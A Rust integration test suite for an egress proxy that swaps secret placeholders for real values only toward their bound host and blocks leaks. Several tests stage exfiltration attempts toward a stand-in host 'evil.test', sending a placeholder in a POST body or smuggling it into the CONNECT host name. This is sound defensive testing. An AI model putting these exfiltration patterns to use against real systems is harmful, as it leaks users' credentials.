//! derm-egress end to end in one process: a client that trusts only derm's
//! CA tunnels through the proxy to a local TLS server signed by a second,
//! unrelated CA, which records exactly what reached it. Names resolve to
//! that server through the config's resolver, so the case runs with the real
//! host names (`api.github.com`) and no network. Case 217 (every form), the
//! records of `events.md` section 6.3, and the proxy's own refusals.

use std::io::{BufRead, BufReader, Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use derm_core::event::Event;
use derm_egress::ca::Ca;
use derm_egress::http;
use derm_egress::{Config, Egress, Policy, Secret};
use rustls::pki_types::ServerName;

const PH: &str = "dermsecret_github_0123456789abcdef";
const VAL: &str = "fake-secret-value-not-a-token-0000";

/// What the upstream saw, one entry per request.
type Seen = Arc<Mutex<Vec<(http::Head, Vec<u8>)>>>;

struct Upstream {
    addr: SocketAddr,
    ca: Arc<Ca>,
    seen: Seen,
}

/// A TLS server for every name, answering `reply` to each request (one per
/// connection, as derm-egress sends `connection: close`).
fn upstream(reply: &'static [u8]) -> Upstream {
    let ca = Arc::new(Ca::generate().unwrap());
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let seen: Seen = Arc::default();
    let (ca2, seen2) = (ca.clone(), seen.clone());
    std::thread::spawn(move || {
        for conn in listener.incoming() {
            let Ok(conn) = conn else { continue };
            let (ca, seen) = (ca2.clone(), seen2.clone());
            std::thread::spawn(move || {
                let mut acc = rustls::server::Acceptor::default();
                let mut tcp = conn;
                let accepted = loop {
                    if acc.read_tls(&mut tcp).unwrap_or(0) == 0 {
                        return;
                    }
                    if let Ok(Some(a)) = acc.accept() {
                        break a;
                    }
                };
                let name = accepted
                    .client_hello()
                    .server_name()
                    .unwrap_or("none")
                    .to_string();
                let key = ca.leaf(&name).unwrap();
                let mut cfg = rustls::ServerConfig::builder_with_provider(Arc::new(
                    rustls::crypto::ring::default_provider(),
                ))
                .with_safe_default_protocol_versions()
                .unwrap()
                .with_no_client_auth()
                .with_cert_resolver(Arc::new(One(key)));
                cfg.alpn_protocols = vec![b"http/1.1".to_vec()];
                let Ok(c) = accepted.into_connection(Arc::new(cfg)) else {
                    return;
                };
                let mut s = BufReader::new(rustls::StreamOwned::new(c, tcp));
                let Ok(Some(h)) = http::read_head(&mut s) else {
                    return;
                };
                let f = http::request_framing(&h).unwrap();
                let body = http::read_body(&mut s, f).unwrap_or_default();
                seen.lock().unwrap().push((h, body));
                let _ = s.get_mut().write_all(reply);
                let _ = s.get_mut().flush();
                s.get_mut().conn.send_close_notify();
                let _ = s.get_mut().flush();
            });
        }
    });
    Upstream { addr, ca, seen }
}

#[derive(Debug)]
struct One(Arc<rustls::sign::CertifiedKey>);
impl rustls::server::ResolvesServerCert for One {
    fn resolve(
        &self,
        _: rustls::server::ClientHello<'_>,
    ) -> Option<Arc<rustls::sign::CertifiedKey>> {
        Some(self.0.clone())
    }
}

struct Rig {
    egress: Egress,
    ca: Arc<Ca>,
    up: Upstream,
    events: Arc<Mutex<Vec<Event>>>,
    /// The chat's `Proxy-Authorization` line (I-4), as a client derm handed
    /// the URL would send it.
    auth: String,
}

fn rig(reply: &'static [u8], admit: bool, policy: Policy) -> Rig {
    let up = upstream(reply);
    let ca = Arc::new(Ca::generate().unwrap());
    let events: Arc<Mutex<Vec<Event>>> = Arc::default();
    let ev = events.clone();
    let secrets = vec![Secret {
        id: "github".into(),
        value: VAL.into(),
        hosts: vec!["api.github.com".into()],
        placeholder: PH.into(),
    }];
    let mut cfg = Config::new(
        "chat-1",
        "claude-code",
        secrets,
        ca.clone(),
        Arc::new(move |e| ev.lock().unwrap().extend(e)),
    )
    .unwrap();
    let mut roots = rustls::RootCertStore::empty();
    roots.add(up.ca.cert_der().clone()).unwrap();
    let mut tls = rustls::ClientConfig::builder_with_provider(Arc::new(
        rustls::crypto::ring::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .unwrap()
    .with_root_certificates(roots)
    .with_no_client_auth();
    tls.alpn_protocols = vec![b"http/1.1".to_vec()];
    cfg.upstream_tls = Arc::new(tls);
    let addr = up.addr;
    cfg.resolve = Arc::new(move |_, _| Ok(vec![addr]));
    if admit {
        cfg.allow_local = ["api.github.com", "evil.test", "plain.test"]
            .iter()
            .flat_map(|h| [(h.to_string(), 443), (h.to_string(), 80)])
            .collect();
    }
    cfg.policy = policy;
    let auth = format!(
        "Proxy-Authorization: {}\r\n",
        cfg.credential.as_ref().unwrap().header_value()
    );
    Rig {
        egress: Egress::start(cfg).unwrap(),
        ca,
        up,
        events,
        auth,
    }
}

/// A client stream through the proxy: CONNECT, then TLS with `sni`,
/// trusting derm's CA only.
fn tunnel(
    r: &Rig,
    host: &str,
    sni: &str,
) -> Result<rustls::StreamOwned<rustls::ClientConnection, TcpStream>, String> {
    let mut tcp = TcpStream::connect(r.egress.addr()).unwrap();
    tcp.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    write!(
        tcp,
        "CONNECT {host}:443 HTTP/1.1\r\nHost: {host}:443\r\n{}\r\n",
        r.auth
    )
    .unwrap();
    let mut br = BufReader::new(tcp.try_clone().unwrap());
    let mut line = String::new();
    br.read_line(&mut line).unwrap();
    assert!(line.starts_with("HTTP/1.1 200"), "{line}");
    loop {
        let mut l = String::new();
        br.read_line(&mut l).unwrap();
        if l == "\r\n" {
            break;
        }
    }
    let mut roots = rustls::RootCertStore::empty();
    roots.add(r.ca.cert_der().clone()).unwrap();
    let mut cfg = rustls::ClientConfig::builder_with_provider(Arc::new(
        rustls::crypto::ring::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .unwrap()
    .with_root_certificates(roots)
    .with_no_client_auth();
    cfg.alpn_protocols = vec![b"http/1.1".to_vec()];
    let conn = rustls::ClientConnection::new(
        Arc::new(cfg),
        ServerName::try_from(sni.to_string()).unwrap(),
    )
    .unwrap();
    let mut s = rustls::StreamOwned::new(conn, tcp);
    s.flush().map_err(|e| e.to_string())?;
    while s.conn.is_handshaking() {
        s.conn.complete_io(&mut s.sock).map_err(|e| e.to_string())?;
    }
    Ok(s)
}

/// Send `req` and read the whole response (the proxy or the upstream closes).
fn ask(s: &mut rustls::StreamOwned<rustls::ClientConnection, TcpStream>, req: &str) -> String {
    s.write_all(req.as_bytes()).unwrap();
    s.flush().unwrap();
    let mut out = Vec::new();
    let _ = s.read_to_end(&mut out);
    String::from_utf8_lossy(&out).into_owned()
}

/// The records once the connection's `egress.connect` has arrived.
fn records(r: &Rig, n_connect: usize) -> Vec<Event> {
    let t = Instant::now();
    loop {
        let e = r.events.lock().unwrap().clone();
        if e.iter().filter(|x| x.kind == "egress.connect").count() >= n_connect
            || t.elapsed() > Duration::from_secs(5)
        {
            return e;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

fn no_value_in(events: &[Event]) {
    let text = serde_json::to_string(events).unwrap();
    assert!(!text.contains(VAL), "a record holds the value: {text}");
    assert!(!text.contains(PH), "a record holds the placeholder: {text}");
}

#[test]
fn the_placeholder_is_swapped_on_the_wire_for_its_own_host_and_recorded_by_id() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    let mut s = tunnel(&r, "api.github.com", "api.github.com").unwrap();
    let resp = ask(
        &mut s,
        &format!("GET /user HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer {PH}\r\nConnection: close\r\n\r\n"),
    );
    assert!(
        resp.starts_with("HTTP/1.1 200") && resp.ends_with("ok"),
        "{resp}"
    );
    let seen = r.up.seen.lock().unwrap();
    assert_eq!(
        seen[0].0.get("authorization"),
        Some(format!("Bearer {VAL}").as_str())
    );
    assert_eq!(seen[0].0.get("connection"), Some("close"));
    drop(seen);
    let e = records(&r, 1);
    let inject = e.iter().find(|x| x.kind == "secret.inject").unwrap();
    assert_eq!(inject.detail["id"], "github");
    assert_eq!(inject.detail["host"], "api.github.com");
    let c = e.iter().find(|x| x.kind == "egress.connect").unwrap();
    assert_eq!(c.detail["verdict"], "forwarded");
    assert_eq!(c.detail["sniMatched"], true);
    assert_eq!(c.chat_id, "chat-1");
    assert_eq!(serde_json::to_value(c.source).unwrap(), "derm");
    no_value_in(&e);
}

#[test]
fn a_placeholder_bound_elsewhere_never_reaches_the_wire_and_is_recorded_as_a_block() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    let mut s = tunnel(&r, "evil.test", "evil.test").unwrap();
    let body = format!("{{\"t\":\"{PH}\"}}");
    let resp = ask(
        &mut s,
        &format!(
            "POST /x HTTP/1.1\r\nHost: evil.test\r\nContent-Length: {}\r\n\r\n{body}",
            body.len()
        ),
    );
    assert!(resp.starts_with("HTTP/1.1 403"), "{resp}");
    assert!(
        r.up.seen.lock().unwrap().is_empty(),
        "nothing reached the upstream"
    );
    let e = records(&r, 1);
    let b = e.iter().find(|x| x.kind == "secret.block").unwrap();
    assert_eq!(b.detail["id"], "github");
    assert_eq!(b.detail["host"], "evil.test");
    assert_eq!(b.detail["place"], "body");
    let c = e.iter().find(|x| x.kind == "egress.connect").unwrap();
    assert_eq!(c.detail["verdict"], "blocked");
    no_value_in(&e);
}

#[test]
fn a_placeholder_in_the_connect_host_is_refused_before_any_byte_goes_out() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    let host = format!("{PH}.evil.test");
    assert!(tunnel(&r, &host, &host).is_err(), "no handshake");
    assert!(r.up.seen.lock().unwrap().is_empty());
    let e = records(&r, 1);
    assert_eq!(
        e.iter().find(|x| x.kind == "secret.block").unwrap().detail["place"],
        "dns"
    );
}

#[test]
fn an_sni_that_is_not_the_connect_host_gets_no_handshake() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    assert!(tunnel(&r, "api.github.com", "evil.test").is_err());
    let e = records(&r, 1);
    let c = e.iter().find(|x| x.kind == "egress.connect").unwrap();
    assert_eq!(c.detail["sniMatched"], false);
    assert_eq!(c.detail["verdict"], "blocked");
    assert!(r.up.seen.lock().unwrap().is_empty());
}

#[test]
fn a_tunnel_that_is_not_tls_is_closed_and_recorded() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    let mut tcp = TcpStream::connect(r.egress.addr()).unwrap();
    tcp.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
    write!(
        tcp,
        "CONNECT evil.test:443 HTTP/1.1\r\n{}\r\nGET / HTTP/1.1\r\nHost: evil.test\r\n\r\n{PH}",
        r.auth
    )
    .unwrap();
    let mut out = Vec::new();
    let _ = tcp.read_to_end(&mut out);
    let text = String::from_utf8_lossy(&out);
    assert!(
        text.starts_with("HTTP/1.1 200") && !text.contains("HTTP/1.1 200 OK"),
        "{text}"
    );
    let e = records(&r, 1);
    let c = e.iter().find(|x| x.kind == "egress.connect").unwrap();
    assert_eq!(c.detail["tls"], false);
    assert_eq!(c.detail["verdict"], "blocked");
    assert!(r.up.seen.lock().unwrap().is_empty());
}

#[test]
fn a_secret_is_never_swapped_in_over_plain_http_even_for_its_own_host() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    let mut tcp = TcpStream::connect(r.egress.addr()).unwrap();
    tcp.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
    write!(tcp, "GET http://api.github.com/user HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer {PH}\r\n{}\r\n", r.auth).unwrap();
    let mut out = String::new();
    let _ = tcp.read_to_string(&mut out);
    assert!(out.starts_with("HTTP/1.1 403"), "{out}");
    assert!(r.up.seen.lock().unwrap().is_empty());
    no_value_in(&records(&r, 1));
}

#[test]
fn a_host_that_resolves_to_a_local_address_is_refused_unless_admitted() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        false,
        Policy::default(),
    );
    let mut s = tunnel(&r, "api.github.com", "api.github.com").unwrap();
    let resp = ask(&mut s, "GET / HTTP/1.1\r\nHost: api.github.com\r\n\r\n");
    assert!(
        resp.starts_with("HTTP/1.1 502") && resp.contains("non-public"),
        "{resp}"
    );
    assert!(r.up.seen.lock().unwrap().is_empty());
    let c = records(&r, 1)
        .into_iter()
        .find(|x| x.kind == "egress.connect")
        .unwrap();
    assert_eq!(c.detail["verdict"], "blocked");
}

#[test]
fn a_kept_alive_tunnel_decides_each_request_and_counts_them() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    let mut s = tunnel(&r, "api.github.com", "api.github.com").unwrap();
    let mut br = BufReader::new(&mut s);
    for i in 0..2 {
        br.get_mut()
            .write_all(
                format!("GET /{i} HTTP/1.1\r\nHost: api.github.com\r\nX-T: {PH}\r\n\r\n")
                    .as_bytes(),
            )
            .unwrap();
        br.get_mut().flush().unwrap();
        let h = http::read_head(&mut br).ok().flatten().unwrap();
        assert_eq!(h.line[1], "200");
        assert!(
            h.get("connection").is_none(),
            "kept alive toward the client"
        );
        let mut b = [0u8; 2];
        br.read_exact(&mut b).unwrap();
        assert_eq!(&b, b"ok");
    }
    drop(br);
    drop(s);
    let e = records(&r, 1);
    assert_eq!(
        e.iter()
            .find(|x| x.kind == "egress.connect")
            .unwrap()
            .detail["requests"],
        2
    );
    assert_eq!(e.iter().filter(|x| x.kind == "secret.inject").count(), 2);
    let seen = r.up.seen.lock().unwrap();
    assert!(seen.iter().all(|(h, _)| h.get("x-t") == Some(VAL)));
}

#[test]
fn a_chunked_body_is_swapped_and_sent_with_a_length_and_a_chunked_reply_is_relayed_whole() {
    let reply: &'static [u8] = b"HTTP/1.1 200 OK\r\ntransfer-encoding: chunked\r\n\r\n5\r\nhello\r\n6\r\n world\r\n0\r\n\r\n";
    // A body swap needs the field in the secret's placement (decision 2;
    // review W6C-S8), and a body typed JSON or form.
    let r = rig(
        reply,
        true,
        Policy {
            swap_body: vec![("github".into(), "k".into())],
            ..Policy::default()
        },
    );
    let mut s = tunnel(&r, "api.github.com", "api.github.com").unwrap();
    let chunk = format!("{{\"k\":\"{PH}\"}}");
    let req = format!(
        "POST /x HTTP/1.1\r\nHost: api.github.com\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n{:x}\r\n{chunk}\r\n0\r\n\r\n",
        chunk.len()
    );
    let resp = ask(&mut s, &req);
    assert!(
        resp.contains("5\r\nhello\r\n6\r\n world\r\n0\r\n\r\n"),
        "{resp}"
    );
    let seen = r.up.seen.lock().unwrap();
    let want = format!("{{\"k\":\"{VAL}\"}}");
    assert_eq!(seen[0].1, want.as_bytes());
    assert_eq!(
        seen[0].0.get("content-length"),
        Some(want.len().to_string().as_str())
    );
    assert!(seen[0].0.get("transfer-encoding").is_none());
}

#[test]
fn an_upgrade_is_refused_and_the_allow_list_holds() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy {
            allow: Some(vec!["api.github.com".into()]),
            ..Policy::default()
        },
    );
    let mut s = tunnel(&r, "api.github.com", "api.github.com").unwrap();
    let resp = ask(&mut s, "GET /ws HTTP/1.1\r\nHost: api.github.com\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\n");
    assert!(resp.starts_with("HTTP/1.1 501"), "{resp}");
    assert!(
        tunnel(&r, "evil.test", "evil.test").is_err(),
        "not on the allow list"
    );
    assert!(r.up.seen.lock().unwrap().is_empty());
}

/// Decision 2, item 2, on the wire (integration w6's close): with no
/// placement a body keeps the placeholder; with the query placed, the value
/// reaches the upstream in the query and not in the path, and the swap is
/// recorded.
#[test]
fn on_the_wire_the_value_goes_only_where_the_secrets_placement_says() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    let mut s = tunnel(&r, "api.github.com", "api.github.com").unwrap();
    let body = format!("k={PH}");
    let resp = ask(
        &mut s,
        &format!(
            "POST /x HTTP/1.1\r\nHost: api.github.com\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        ),
    );
    assert!(resp.starts_with("HTTP/1.1 200"), "{resp}");
    assert_eq!(r.up.seen.lock().unwrap()[0].1, body.as_bytes());
    let q = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy {
            swap_query: vec![("github".into(), "t".into())],
            ..Policy::default()
        },
    );
    let mut s = tunnel(&q, "api.github.com", "api.github.com").unwrap();
    let resp = ask(
        &mut s,
        &format!(
            "GET /p/{PH}?t={PH} HTTP/1.1\r\nHost: api.github.com\r\nConnection: close\r\n\r\n"
        ),
    );
    assert!(resp.starts_with("HTTP/1.1 200"), "{resp}");
    assert_eq!(
        q.up.seen.lock().unwrap()[0].0.line[1],
        format!("/p/{PH}?t={VAL}"),
        "the query takes the value, the path keeps the placeholder"
    );
    let e = records(&q, 1);
    assert!(e.iter().any(|x| x.kind == "secret.inject"));
    no_value_in(&e);
}

/// I-4 (plan step P10; note CC section 6): a local client without the chat's
/// credential gets 407 and nothing else: no handshake, no byte upstream, no
/// record under the chat's id. A wrong one, two of them, or one on a plain
/// request fare the same. The URL the chat is handed carries it; the one a
/// start line shows does not.
#[test]
fn a_client_without_the_chats_proxy_credential_gets_407_and_no_record() {
    let r = rig(
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok",
        true,
        Policy::default(),
    );
    let wrong = format!(
        "Proxy-Authorization: {}\r\n",
        derm_egress::auth::ProxyCredential::mint()
            .unwrap()
            .header_value()
    );
    let heads = [
        "CONNECT api.github.com:443 HTTP/1.1\r\nHost: api.github.com:443\r\n\r\n".to_string(),
        format!("CONNECT api.github.com:443 HTTP/1.1\r\n{wrong}\r\n"),
        format!(
            "CONNECT api.github.com:443 HTTP/1.1\r\n{}{}\r\n",
            r.auth, r.auth
        ),
        format!(
            "CONNECT api.github.com:443 HTTP/1.1\r\n{}\r\n",
            r.auth.replace("Proxy-", "")
        ),
        format!("GET http://plain.test/ HTTP/1.1\r\nHost: plain.test\r\n{wrong}\r\n"),
    ];
    for head in &heads {
        let mut tcp = TcpStream::connect(r.egress.addr()).unwrap();
        tcp.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
        tcp.write_all(head.as_bytes()).unwrap();
        let mut out = String::new();
        let _ = tcp.read_to_string(&mut out);
        assert!(
            out.starts_with("HTTP/1.1 407 Proxy Authentication Required\r\n")
                && out.contains("Proxy-Authenticate: Basic realm=\"derm\"\r\n"),
            "{head:?}: {out}"
        );
    }
    assert_eq!(r.egress.refused_without_credential(), heads.len() as u64);
    // The chat's own client still gets through, and its connection is the
    // only one recorded.
    let mut s = tunnel(&r, "api.github.com", "api.github.com").unwrap();
    let got = ask(
        &mut s,
        "GET /user HTTP/1.1\r\nHost: api.github.com\r\nconnection: close\r\n\r\n",
    );
    assert!(got.starts_with("HTTP/1.1 200"), "{got}");
    let e = records(&r, 1);
    std::thread::sleep(Duration::from_millis(200));
    let e2 = r.events.lock().unwrap().clone();
    assert_eq!(e2.len(), e.len());
    assert_eq!(
        e2.iter().filter(|x| x.kind == "egress.connect").count(),
        1,
        "{e2:?}"
    );
    assert_eq!(r.up.seen.lock().unwrap().len(), 1);
    // The header never goes upstream.
    let seen = r.up.seen.lock().unwrap();
    assert!(seen[0].0.get("proxy-authorization").is_none());
    drop(seen);
    let url = r.egress.url();
    let port = r.egress.port();
    assert!(
        url.starts_with("http://derm:") && url.ends_with(&format!("@127.0.0.1:{port}")),
        "{url}"
    );
    assert_eq!(
        r.egress.shown_url(),
        format!("http://<credential>@127.0.0.1:{port}")
    );
}
